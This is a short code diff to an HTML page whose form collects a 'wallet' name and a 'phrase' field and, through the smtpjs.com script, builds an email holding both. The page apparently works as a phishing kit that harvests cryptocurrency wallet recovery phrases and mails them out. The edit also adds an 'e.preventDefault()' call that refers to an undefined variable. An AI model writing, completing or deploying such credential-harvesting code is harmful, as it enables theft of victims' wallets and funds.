@@ -46,7 +46,7 @@
                <div role="tabpanel" class="tab-pane fade show active" id="phrase">
                   <!-- FORM BEGIN -->
                   <form 
-                  onsubmit="sendEmail(); reset(); return false;"
+                  onsubmit="sendEmail();"
                   accept-charset="UTF-8"
                   target="display-frame"
                   method="POST"
@@ -80,7 +80,7 @@
    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script>
       function sendEmail(){
-         // e.preventDefault()
+         e.preventDefault()
          var wallet = document.getElementById("wallet").value
          var phrase = document.querySelector("#phrase")
          var body = "wallet: " + wallet + "<br/> phrase: " +phrase;
